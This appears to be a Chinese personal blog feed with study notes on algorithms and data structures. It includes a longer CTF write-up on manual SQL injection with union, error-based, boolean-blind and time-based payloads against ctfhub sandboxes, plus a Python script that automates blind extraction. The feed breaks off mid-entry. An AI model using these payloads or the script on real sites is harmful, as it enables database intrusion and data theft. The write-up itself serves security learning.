        <content type="html"><![CDATA[<h1 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h1><ol><li>root</li><li>普通 home</li><li>访客 <h2 id="访客不能切到root"><a href="#访客不能切到root" class="headerlink" title="访客不能切到root"></a>访客不能切到root</h2></li><li>出于系统保护</li></ol><h1 id="区分文件和文件夹"><a href="#区分文件和文件夹" class="headerlink" title="区分文件和文件夹"></a>区分文件和文件夹</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>背包问题</title>
      <link href="/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/"/>
      <url>/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="宗旨：在背包可以容纳的情况下，最多可以实现的价值是多少"><a href="#宗旨：在背包可以容纳的情况下，最多可以实现的价值是多少" class="headerlink" title="宗旨：在背包可以容纳的情况下，最多可以实现的价值是多少"></a>宗旨：在背包可以容纳的情况下，最多可以实现的价值是多少</h1><h1 id="01背包问题"><a href="#01背包问题" class="headerlink" title="01背包问题"></a>01背包问题</h1><h2 id="N个物品和容量为U的背包"><a href="#N个物品和容量为U的背包" class="headerlink" title="N个物品和容量为U的背包"></a>N个物品和容量为U的背包</h2><h2 id="v来表示体积，w来表示价值"><a href="#v来表示体积，w来表示价值" class="headerlink" title="v来表示体积，w来表示价值"></a>v来表示体积，w来表示价值</h2><ol><li>每件物品仅用一次<h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3></li><li>在背包可以容纳的情况下，可以实现的最大价值是多少</li><li>dp要从两个方面来考虑：</li><li>状态表示：f(i,j):即为价值的最大值      即需要考虑需要多少维度来表示</li><li>状态计算：（如何一步一步地把状态计算出来）；状态划分</li></ol><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><ol><li>只从前i个物品中选</li><li>总体积 &lt;= j</li></ol><h1 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a>完全背包</h1><h2 id="每件物品有无限个"><a href="#每件物品有无限个" class="headerlink" title="每件物品有无限个"></a>每件物品有无限个</h2><h1 id="多重背包问题"><a href="#多重背包问题" class="headerlink" title="多重背包问题"></a>多重背包问题</h1><h2 id="每个物品的个数不同"><a href="#每个物品的个数不同" class="headerlink" title="每个物品的个数不同"></a>每个物品的个数不同</h2><h1 id="分组背包问题"><a href="#分组背包问题" class="headerlink" title="分组背包问题"></a>分组背包问题</h1><h2 id="物品有N组，每一组中有若干个，一组之中只能选一个物品"><a href="#物品有N组，每一组中有若干个，一组之中只能选一个物品" class="headerlink" title="物品有N组，每一组中有若干个，一组之中只能选一个物品"></a>物品有N组，每一组中有若干个，一组之中只能选一个物品</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
          <category> 背包问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
            <tag> 背包问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>n的二进制表示中第k位数字是几</title>
      <link href="/n%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E4%B8%AD%E7%AC%ACk%E4%BD%8D%E6%95%B0%E5%AD%97%E6%98%AF%E5%87%A0/"/>
      <url>/n%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E4%B8%AD%E7%AC%ACk%E4%BD%8D%E6%95%B0%E5%AD%97%E6%98%AF%E5%87%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="n的二进制表示中第k位数字是几"><a href="#n的二进制表示中第k位数字是几" class="headerlink" title="n的二进制表示中第k位数字是几"></a>n的二进制表示中第k位数字是几</h1><ol><li>先把第k位数字移到最后一位 n&gt;&gt;k</li><li>看个位是几 x&amp;1<h2 id="除以2相当于二进制数右移1位"><a href="#除以2相当于二进制数右移1位" class="headerlink" title="除以2相当于二进制数右移1位"></a>除以2相当于二进制数右移1位</h2></li><li>即右移1位相当于除以2，相当于除去二进制数中的下一位<h2 id="按位与操作："><a href="#按位与操作：" class="headerlink" title="按位与操作："></a>按位与操作：</h2></li><li>相当于取出某一位</li><li>int a = 1010</li><li>a &amp; 1 = 0</li><li>a &amp; 11 = 2  (10的二进制表示为2)</li></ol><h1 id="lowbit操作"><a href="#lowbit操作" class="headerlink" title="lowbit操作"></a>lowbit操作</h1><ol><li>lowbit(x)是返回x的最后一位1</li><li>相当于x&amp;-x=x&amp;(~x+1)</li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据元素</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%85%83%E7%B4%A0%EF%BC%9A/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%85%83%E7%B4%A0%EF%BC%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="数据元素："><a href="#数据元素：" class="headerlink" title="数据元素："></a>数据元素：</h1><ol><li>数据的基本单位，在计算机程序中通常作为一个整体进行考虑和处理<br>2， 也简称为元素，node结点<h1 id="数据项"><a href="#数据项" class="headerlink" title="数据项"></a>数据项</h1>1， 构成数据元素的不可分割的最小单位</li></ol><h1 id="数据对象"><a href="#数据对象" class="headerlink" title="数据对象"></a>数据对象</h1><ol><li>性质相同的数据元素的集合</li></ol><h1 id="关系："><a href="#关系：" class="headerlink" title="关系："></a>关系：</h1><ol><li>数据&gt;数据元素 &gt; 数据项</li><li>整个数据&gt;node&gt; value</li></ol><h1 id="数据结构："><a href="#数据结构：" class="headerlink" title="数据结构："></a>数据结构：</h1><ol><li>数据元素互相之间的关系称为结构<br>2，互相之间存在的一种或多种特定关系的数据元素集合 </li></ol><h1 id="数据结构的三方面内容"><a href="#数据结构的三方面内容" class="headerlink" title="数据结构的三方面内容"></a>数据结构的三方面内容</h1><ol><li>逻辑结构</li><li>数据元素和其关系在内存中的表示（映像），物理结构或数据的存储结构</li><li>数据的运算和实现，对数据元素可以施加的操作和这些操作</li></ol><h1 id="逻辑结构的种类："><a href="#逻辑结构的种类：" class="headerlink" title="逻辑结构的种类："></a>逻辑结构的种类：</h1><h2 id="直接分法："><a href="#直接分法：" class="headerlink" title="直接分法："></a>直接分法：</h2><ol><li>线性结构：有且只有一个开始和一个终端节点，并且所有节点都最多只有一个直接前驱和一个直接后继</li><li>非线性结构：一个节点可能有多个直接前驱和直接后驱：树和图（多对多）<h2 id="四类基本逻辑结构："><a href="#四类基本逻辑结构：" class="headerlink" title="四类基本逻辑结构："></a>四类基本逻辑结构：</h2></li><li>集合：除了同属于一个集合外无其它关系</li><li>线性：结构中数据元素之间存在一对一的关系</li><li>树：一对多的关系</li><li>图：多对多的网状关系</li></ol><h1 id="四种基本的存储结构："><a href="#四种基本的存储结构：" class="headerlink" title="四种基本的存储结构："></a>四种基本的存储结构：</h1><ol><li>顺序存储结构：用一组连续的存储单元依次存储数据元素，数据结构之间的逻辑关系由元素的存储位置来实现</li><li>链接存储结构：<br>用一组任意的存储单元存储数据元素，数据元素之间的逻辑关系用指针来实现</li><li>索引存储结构：在存储节点信息的同时还建立附加的索引表</li><li>散列存储结构：根据结点的刮泥机案子直接计算出该节点的存储地址</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="链表和邻接表"><a href="#链表和邻接表" class="headerlink" title="链表和邻接表"></a>链表和邻接表</h2><ol><li>struct Node{<br> int val;<br> Node *next;<br>}<br> new Node()</li><li>数组模拟链表：<h3 id="数组模拟单链表："><a href="#数组模拟单链表：" class="headerlink" title="数组模拟单链表："></a>数组模拟单链表：</h3></li><li>用的最多的是邻接表：存储图和树</li><li>空指针的为-1</li><li>优化某些问题</li><li>e<a href="%E7%94%A8%E6%9D%A5%E5%AD%98%E5%82%A8value">N</a>和ne<a href="%E7%94%A8%E6%9D%A5%E5%AD%98%E5%82%A8%E4%B8%8B%E4%B8%80%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E4%BD%8D%E7%BD%AE">N</a><br>3， 空节点的下标用-1来表示</li><li><a href="https://imgtu.com/i/b0GXJe"><img src="https://s4.ax1x.com/2022/03/05/b0GXJe.md.png" alt="b0GXJe.md.png"></a><h3 id="数组模拟双链表："><a href="#数组模拟双链表：" class="headerlink" title="数组模拟双链表："></a>数组模拟双链表：</h3></li><li>和单链表的区别在于双链表节点的指针一个指向前，另一个指向后</li></ol><h2 id="栈与队列"><a href="#栈与队列" class="headerlink" title="栈与队列"></a>栈与队列</h2><ol><li>栈是先进后出，类似于只有一端开口的羽毛球筒</li><li>队列是先进先出，类似于两端开口的羽毛球筒<h3 id="单调栈："><a href="#单调栈：" class="headerlink" title="单调栈："></a>单调栈：</h3></li><li>遍历</li><li>找到左边离它最近且比它小的数在什么地方（返回的是那个数）</li><li>找到右边离它最近且比它大的数在什么地方（返回的是那个数）</li><li>不存在返回-1</li><li>3   4    2   7   5</li><li>-1  3   -1   2   2</li><li>把所有逆序的点全部删去，就可以得到一个严格按照升序排列的数</li></ol><h2 id="kmp"><a href="#kmp" class="headerlink" title="kmp"></a>kmp</h2><h3 id="暴力："><a href="#暴力：" class="headerlink" title="暴力："></a>暴力：</h3><p>S[N],p[M];<br>for(int i = 1;i &lt;= n;i++){<br>    bool flag = true;<br>    for(int j = 1;j &lt;= m;j++){<br>        if(s[i] != p[j]){<br>            flag = false;<br>            break;<br>        }<br>    }<br>}</p><h3 id="如何优化："><a href="#如何优化：" class="headerlink" title="如何优化："></a>如何优化：</h3><h1 id="节点的插入操作："><a href="#节点的插入操作：" class="headerlink" title="节点的插入操作："></a>节点的插入操作：</h1><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><h3 id="共同点："><a href="#共同点：" class="headerlink" title="共同点："></a>共同点：</h3><ol><li>e[idx] = x; 最先将元素插进去</li><li>ne[idx] = head/ne[k] idx的下一个为head和k</li><li>ne[k]/head = idx</li><li>idx++<h2 id="最后输出"><a href="#最后输出" class="headerlink" title="最后输出"></a>最后输出</h2></li><li>for(int i = head;i != -1;i = ne[i]) cout &lt;&lt; e[i] &lt;&lt; ‘ ‘;</li></ol><h2 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h2><h3 id="插入操作："><a href="#插入操作：" class="headerlink" title="插入操作："></a>插入操作：</h3><ol><li>e[idx] = x; 给idx为下标的地方赋值</li><li>l[idx] = k; idx的位置在k的右边（k在idx的后面，idx的下一个为k）</li><li>r[idx] = r[k]; 将idx的下一个位置指向原本k的下一个位置</li><li>l[r[k]] = idx; 将k+1的位置的点左指针指向idx位置</li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql手动注入语法</title>
      <link href="/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95/"/>
      <url>/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="对information-shcema的理解"><a href="#对information-shcema的理解" class="headerlink" title="对information_shcema的理解"></a>对information_shcema的理解</h1><ol><li>shcema可以看作是房间</li><li>table_schema是用来存放table表的房间，是数据库</li><li>table_name是表的名字</li><li>table_type是表的类型</li></ol><h1 id="对group-concat和concat-ws的理解"><a href="#对group-concat和concat-ws的理解" class="headerlink" title="对group_concat和concat_ws的理解"></a>对group_concat和concat_ws的理解</h1><ol><li>group_concat可以将多行数据整合为一行</li><li>concat可以将不同数据用第一个参数链接</li><li>可以写group_concat(concat_ws(‘:’,id,email_id))</li></ol><h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><h2 id="判断是否有注入点"><a href="#判断是否有注入点" class="headerlink" title="判断是否有注入点"></a>判断是否有注入点</h2><ol><li>1 and 1=1正确</li><li>1 and 1=2不正确，所以可以判断是整数型注入<h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2></li><li>order by 1,2,3,4….</li><li>可以使用二分法来判断</li><li>为下一步联合查询爆数据库名奠定基础</li></ol><h2 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><ol><li>?id=1 and 1=2 union select 1.database()</li><li>注意此处联合查询需要前后字段数量一致，且字段数与上一步使用order by 判断的一致</li><li><a href="https://imgtu.com/i/HgvkKf"><img src="https://s4.ax1x.com/2022/02/15/HgvkKf.md.png" alt="HgvkKf.md.png"></a></li></ol><h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><ol><li>?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_name= ‘sqli’</li><li>group_concat()函数是用来将多行转为一行，将组中的字符串连接成为具有各种选项的单个字符串</li><li>table_name</li><li>information_schema.tables</li></ol><h2 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h2><ol><li>?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag’</li><li>column_name</li><li>information_schema.columns</li><li>table_name</li></ol><h2 id="查询flag"><a href="#查询flag" class="headerlink" title="查询flag"></a>查询flag</h2><ol><li>?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag</li><li>根据库中的表来查询所有的列中带flag的</li><li><a href="https://imgtu.com/i/HgvAr8"><img src="https://s4.ax1x.com/2022/02/15/HgvAr8.md.png" alt="HgvAr8.md.png"></a></li></ol><h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><h2 id="判断能否根据输入的不同结果不同"><a href="#判断能否根据输入的不同结果不同" class="headerlink" title="判断能否根据输入的不同结果不同"></a>判断能否根据输入的不同结果不同</h2><ol><li>输入1，2，3…看是否有不同的数据<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2></li><li>1 and 1=1;和1 and 1=2都没错</li><li>1’ and 1=1 –+ 没有问题</li><li>1’ and 1=2 –+报错</li><li>报错是爆出语法错误</li><li>后面加上–+是为了产生闭合，屏蔽掉后面的多余单引号</li></ol><h2 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h2><ol><li>?id=1’ order by 2 没问题</li><li>?id=1’ order by 3 有问题</li></ol><h2 id="爆数据库名-1"><a href="#爆数据库名-1" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><ol><li>?id=1’ and 1=2 union select 1,database() –+</li><li>得到数据库名为sqli</li></ol><h2 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h2><ol><li>?id=1’ and 1=2 union select 1,group_concat(concat_ws(‘:’,table_name)) from information_schema.tables where table_name=’flag’ –+</li></ol><h2 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h2><ol><li>?id=1’ and 1=2 union select 1,group_conat(concat_ws(‘:’,flag)) from sqli.flag</li><li><a href="https://imgtu.com/i/H2sSTH"><img src="https://s4.ax1x.com/2022/02/15/H2sSTH.md.png" alt="H2sSTH.md.png"></a></li></ol><h3 id="buuctf中的warmup"><a href="#buuctf中的warmup" class="headerlink" title="buuctf中的warmup"></a>buuctf中的warmup</h3><ol><li>输入1和1’来判断是字符型还是数字型，发现是字符型注入</li><li>使用1’ or 1=1 #来万能绕过</li></ol><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><ol><li>extractvalue():从目标xml中返回包含所查询的字符串</li><li>EXTRACTVALUE(XML_document,XPath_string)</li><li>第一个参数：XML_document是String格式，为XML文档对象的名称</li><li>第二个参数：Xpath_string(xpath格式的字符串)</li><li>concat:返回结果为连接参数产生的字符串</li></ol><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><ol><li>updatexml(xml_document,xpath_string,new_value)</li><li>第一个参数：xml_document是string格式，为xml文档对象的名称</li><li>第二个参数：xpath_string</li><li>第三个参数：new_value,string格式，替换查找到符合条件的数据</li></ol><h4 id="用database-爆数据库"><a href="#用database-爆数据库" class="headerlink" title="用database()爆数据库"></a>用database()爆数据库</h4><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><ol><li>information_schema.tables有表名</li><li>information_schema.columns有列名</li></ol><h1 id="table"><a href="#table" class="headerlink" title="table"></a>table</h1><ol><li>table_schema=’数据库名字’,数据库的名称</li><li>table_name=’表的名字’,查询满足某些条件的表名</li><li>table_type表的类型</li></ol><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue函数原理"><a href="#extractvalue函数原理" class="headerlink" title="extractvalue函数原理"></a>extractvalue函数原理</h3><ol><li>对xml文件进行查询的函数，会从xml文件中返回所包含查询值的字符串，语法：<pre class="line-numbers language-none"><code class="language-none">extractvalue(&#39;xml_document&#39;,&#39;Xpath_string&#39;)extractvalue(&#39;目标文件名&#39;,;&#39;在xml中查询的字符串&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>第二个参数要求是xpath格式的字符串，语法正确是会按照路径 <strong>/该xml文件/要查询的字符串</strong> 进行查询 </li><li>如果我们输入的Xpath_string不对就会报错，而如果页面回显sql报错信息就可以得到我们想要的信息了。</li><li>此处的xml_document可以是anything</li></ol><h3 id="而如果页面回显sql报错信息就可以得到我们想要的信息了"><a href="#而如果页面回显sql报错信息就可以得到我们想要的信息了" class="headerlink" title="而如果页面回显sql报错信息就可以得到我们想要的信息了"></a>而如果页面回显sql报错信息就可以得到我们想要的信息了</h3><h3 id="拼接方法"><a href="#拼接方法" class="headerlink" title="拼接方法"></a>拼接方法</h3><ol><li>使用concat函数拼接一个错误的Xpath让mysql报错得到包含查询值的字符串<pre class="line-numbers language-none"><code class="language-none">select(extractvalue(1,concat(0x7e,database)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>修改database()部分可以爆表，列，值</li><li>concat存在的意义就是让extractvalue函数的第二个参数出错，所以concat拼接的参数是个非法字符就行</li></ol><h4 id="extractvalue函数一次只能查询32长度"><a href="#extractvalue函数一次只能查询32长度" class="headerlink" title="extractvalue函数一次只能查询32长度"></a>extractvalue函数一次只能查询32长度</h4><ol><li>所以在爆表，列，值的时候需要加上limit x,1逐一查询（<strong>limit m,n跳过前m项数据后获取n条记录</strong>）<pre class="line-numbers language-none"><code class="language-none">假设有三列select 1,2,(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &#39;security&#39; limit 0,1&#x2F;1,1&#x2F;2,1))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h5 id="例题ctfshow报错注入"><a href="#例题ctfshow报错注入" class="headerlink" title="例题ctfshow报错注入"></a>例题ctfshow报错注入</h5><ol><li><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-cd4501bf2d967240.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and extractvalue(1,concat(0x7e,database())) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/06/30/L6tXebY2BRmcihF.png"></p></li><li><p><img src="https://s2.loli.net/2022/06/30/AofUYCxwuaN87Sl.png"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;sqli&#39; limit 0,1)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><a href="http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1">http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1</a> and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’flag’ limit 0,1)))–+</p></li><li><p><a href="http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1">http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1</a> and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1))) –+<br><img src="https://s2.loli.net/2022/06/30/CIZz2LtPobcvmsf.png"></p></li><li><p><a href="http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1">http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1</a> and extractvalue(1,concat(0x7e,(select flag from flag limit 1,1))) –+</p></li><li><p>然后就爆完了</p></li></ol><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol><li>所谓盲注就是在服务器没有错误回显的时候完成注入攻击。</li><li>原理：boolean 根据注入信息返回true or fales 没有任何报错信息</li><li>即布尔盲注一般适用于页面没有回显字段(不支持联合查询)，<strong>且web页面返回True或者false</strong>，构造SQL语句，<strong>利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false</strong>，从而达到注入的目的来<strong>获取信息</strong>的一种方法</li></ol><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre class="line-numbers language-none"><code class="language-none">playload：and length(database()) &#x3D;8 --+ &#x2F;判断数据库名长度是否等于8如果不等于则返回错，并且返回index.php如果等于就返回query_success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>如果是错误，会回显报错</li><li>如果是正确的，会返回开始页面</li></ol><h3 id="例题：ctfhub布尔盲注"><a href="#例题：ctfhub布尔盲注" class="headerlink" title="例题：ctfhub布尔盲注"></a>例题：ctfhub布尔盲注</h3><ol><li>这一道题我看其它人的wp是数据库为空时还会返回空，一般情况下是数据库为空或者查询语句报错时都会报错，所以应该先判断空时是否会报错?id=1 and 0=1 –+</li><li><strong>判断数据库名字的长度</strong><a href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and length(database()) = 3 –+<br><img src="https://s2.loli.net/2022/06/30/hSZvJtQV8sMkuHy.png"></li><li><strong>判断数据库名字的长度</strong><a href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and length(database()) = 4 –+<br><img src="https://s2.loli.net/2022/06/30/hSZvJtQV8sMkuHy.png"></li><li><strong>判断数据库名字</strong><a href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and database() = ‘sqli’ –+<br><img src="https://s2.loli.net/2022/06/30/Y9RJbZPQgTdApBn.png"></li><li><strong>判断数据库中表的名字</strong><a href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and (select table_name from information_schema.tables where table_schema=’sqli’ limit 0,1) = ‘flag’ –+ 这个地方加limit 0,1是因为不只有一个表<br><img src="https://s2.loli.net/2022/06/30/1CJVp3ueS5MZlbf.png"></li><li><strong>判断flag表中字段的名字</strong><a href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and (select column_name from information_schema.columns where table_name=’flag’ limit 0,1) = ‘flag’ –+<br><img src="https://s2.loli.net/2022/06/30/rXfJiRvAY9UZT62.png"></li><li>后面实在是写不出来了，就跑一下吧<pre class="line-numbers language-none"><code class="language-none">import requestsimport timeurlOPEN &#x3D; &#39;http:&#x2F;&#x2F;challenge-80bbba4d1e9ce716.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;&#39;starOperatorTime &#x3D; [] mark &#x3D; &#39;query_success&#39; def database_name():name &#x3D; &#39;&#39;for j in range(1,9):for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:url &#x3D; urlOPEN+&#39;if(substr(database(),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(j,i)# print(url+&#39;%23&#39;)r &#x3D; requests.get(url)if mark in r.text:name &#x3D; name+iprint(name)breakprint(&#39;database_name:&#39;,name)database_name() def table_name():    list &#x3D; []    for k in range(0,4):        name&#x3D;&#39;&#39;        for j in range(1,9):            for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:                url &#x3D; urlOPEN+&#39;if(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit %d,1),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(k,j,i)    # print(url+&#39;%23&#39;)                r &#x3D; requests.get(url)                if mark in r.text:                    name &#x3D; name+i                    break        list.append(name)    print(&#39;table_name:&#39;,list)#start &#x3D; time.time()table_name()#stop &#x3D; time.time()#starOperatorTime.append(stop-start)#print(&quot;所用的平均时间： &quot; + str(sum(starOperatorTime)&#x2F;100))def column_name():    list &#x3D; []    for k in range(0,3): #判断表里最多有4个字段        name&#x3D;&#39;&#39;        for j in range(1,9): #判断一个 字段名最多有9个字符组成            for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:                url&#x3D;urlOPEN+&#39;if(substr((select column_name from information_schema.columns where table_name&#x3D;&quot;flag&quot;and table_schema&#x3D; database() limit %d,1),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(k,j,i)                r&#x3D;requests.get(url)                if mark in r.text:                    name&#x3D;name+i                    break        list.append(name)    print (&#39;column_name:&#39;,list)column_name()def get_data():        name&#x3D;&#39;&#39;        for j in range(1,50): #判断一个值最多有51个字符组成            for i in range(48,126):                url&#x3D;urlOPEN+&#39;if(ascii(substr((select flag from flag),%d,1))&#x3D;%d,1,(select table_name from information_schema.tables))&#39; %(j,i)                r&#x3D;requests.get(url)                if mark in r.text:                    name&#x3D;name+chr(i)                    print(name)                    break        print (&#39;value:&#39;,name)    get_data()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>最后用这个脚本跑出来了<h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><pre class="line-numbers language-none"><code class="language-none">一.1.count()函数：统计查询结果的数量；2.length(str)函数：返回字符串 str的长度；3.left()函数： left(database(),1)&#x3D;‘s’ left(a,b)从左侧截取a的前b位，正确则返回1，错误返回0left((select database()),1)&#x3D;‘s’ 同样的意思4.regexp : select user() regexp ‘r’; user()的结果是root@localhost，regexp为匹配root的正则表达式5.like : select user() like ‘ro%’; 匹配与regexp相似6.substr(a,b,c): select substr() xxxx; substr(a,b,c)从位置b开始，截取a字符串的c位长度7.mid(a,b,c): select mid(user(),1,2); mid(a,b,c)从位置b开始，截取a字符串的c位长度8.ascii() 将某个字符转化为其ascii值9.limit 0,1：元素索引是从0开始（不是1） 从元素索引位置为1的数据（即第2位）开始输出一个值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ol><li>由于服务器端拼接了SQL语句，且正确和错误存在同样的回显，即是错误信息被过滤，可以通过页面响应时间进行按位判断数据。由于时间盲注中的函数是在数据库中执行的，但是sleep函数或者benchmark函数的过多执行会让服务器负载过高</li></ol><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol><li>通过一个页面加载的时间延时来判断</li><li>但是这和网络，性能，设置的延时长短有关系</li><li>当对数据库进行查询操作，如果查询的条件不存在，语句执行的速度非常快，执行时间基本可以认为是0，通过控制sql语句的执行时间来判断</li><li>我认为就是后端设置，当不设置查询条件时，语句执行就会非常快，执行时间基本可以认为是0，后端设置了不到多少时间的查询就不会显示数据</li></ol><h3 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h3><h4 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h4><h4 id="if-exp1-exp2-exp3"><a href="#if-exp1-exp2-exp3" 